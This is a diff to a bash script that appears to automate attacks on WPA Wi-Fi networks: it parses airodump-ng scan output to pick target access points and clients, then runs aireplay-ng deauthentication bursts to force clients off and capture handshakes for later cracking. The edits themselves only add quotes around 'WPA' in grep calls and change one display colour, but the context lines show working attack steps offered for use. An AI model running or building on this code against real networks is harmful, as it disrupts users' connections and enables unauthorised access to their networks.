@@ -42,9 +42,9 @@ fautobot()																#Automagically find active clients and collect new han
 				then
 					BSSID=$BSSIDL
 			fi						
-			ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 14 | head -n 1)
+			ESSID=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 14 | head -n 1)
 			ESSID=${ESSID:1}
-			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep WPA | cut -d ',' -f 4 | head -n 1)
+			CHAN=$(cat $HOME/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
 			CHAN=$((CHAN + 1 - 1))
 			CLIE=$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
 			clear
@@ -84,7 +84,7 @@ fautobot()																#Automagically find active clients and collect new han
 		do
 			clear
 			$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
-			$COLOR 4;$COLOR2 1; echo " [*] TARGET $ESSID LOADED [*] ";$COLOR 9;$COLOR2 9
+			$COLOR 4;$COLOR2 3; echo " [*] TARGET $ESSID LOADED [*] ";$COLOR 9;$COLOR2 9
 			echo
 			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
 			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
@@ -210,7 +210,7 @@ flistap()																#List all APs
 	$COLOR 4;echo " [*] Scanning for APs, Please wait.. ";$COLOR 9
 	sleep 10
 	killall airodump-ng
-	echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > $HOME/tmp1
+	echo "$(cat $HOME/tmp-01.csv | grep "WPA" | cut -d ',' -f 14)" > $HOME/tmp1
 	LNUM=0
 	while read LINE
 		do
@@ -258,8 +258,8 @@ flistap()																#List all APs
 				8)ESSID=${ESSID8:5};;
 				9)ESSID=${ESSID9:5}
 	esac
-	BSSID=$(cat $HOME/tmp-01.csv | grep WPA | grep $ESSID | cut -d ',' -f 1)
-	CHAN=$(cat $HOME/tmp-01.csv | grep WPA | grep $ESSID | cut -d ',' -f 4)
+	BSSID=$(cat $HOME/tmp-01.csv | grep "WPA" | grep $ESSID | cut -d ',' -f 1)
+	CHAN=$(cat $HOME/tmp-01.csv | grep "WPA" | grep $ESSID | cut -d ',' -f 4)
 	CHAN=$((CHAN + 1 - 1))
 	fclientscan
 }
